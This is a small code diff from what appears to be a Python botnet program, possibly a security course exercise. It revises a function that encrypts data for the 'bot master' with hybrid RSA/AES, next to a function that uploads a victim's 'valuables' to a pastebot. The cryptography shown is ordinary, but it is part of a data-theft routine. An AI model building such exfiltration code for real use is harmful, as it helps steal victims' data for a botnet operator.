@@ -38,12 +38,12 @@ def encrypt_for_master(data):
   data_to_encrypt = ANSI_X923_pad(data, cipher.block_size)
   ciphertext      = cipher.encrypt(data_to_encrypt)
   
-  # Use the rsa key to encrypt the symmetric key
+  # Use the public rsa key to encrypt iv and the symmetric key
   pubkey       = RSA.importKey(pubkey_txt)
   rsa_cipher   = PKCS1_OAEP.new(pubkey)
-  encrypted_key = rsa_cipher.encrypt(symmkey)
+  encrypt_cipher_info = rsa_cipher.encrypt(iv + symmkey)
   
-  return iv + encrypted_key + ciphertext
+  return encrypt_cipher_info + ciphertext
 
 def upload_valuables_to_pastebot(fn):
   # Encrypt the valuables so only the bot master can read them
